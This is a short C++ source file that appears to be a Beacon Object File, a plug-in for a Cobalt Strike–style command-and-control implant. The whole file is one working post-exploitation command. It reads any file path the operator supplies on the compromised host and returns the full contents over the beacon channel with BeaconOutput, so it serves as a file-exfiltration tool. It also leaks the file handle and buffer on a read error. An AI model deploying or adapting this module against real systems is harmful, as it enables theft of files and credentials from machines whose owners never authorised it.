#include <general.h>

extern "C" auto go( char* args, int argc ) -> void {
    datap data_parser = { 0 };

    BeaconDataParse( &data_parser, args, argc );

    WCHAR* file_path = (WCHAR*)BeaconDataExtract( &data_parser, nullptr );
    ULONG  file_size = 0;
    ULONG  file_read = 0;
    PVOID  file_buff = nullptr;

    HANDLE file_handle = CreateFileW( file_path, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0 );
    if ( file_handle == INVALID_HANDLE_VALUE )  {
        return;
    }

    file_size = GetFileSize( file_handle, 0 );
    file_buff = HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, file_size );

    if ( ! ReadFile( file_handle, file_buff, file_size, &file_read, 0 ) ) {
        BeaconPrintf( CALLBACK_ERROR, "Failed read file error: (%d) %s\n", GetLastError(), fmt_error( GetLastError() ) );
        return;
    }

    CloseHandle( file_handle );

    BeaconOutput( CALLBACK_OUTPUT, (CHAR*)file_buff, file_size );

    HeapFree( GetProcessHeap(), 0, file_buff );

    return;
}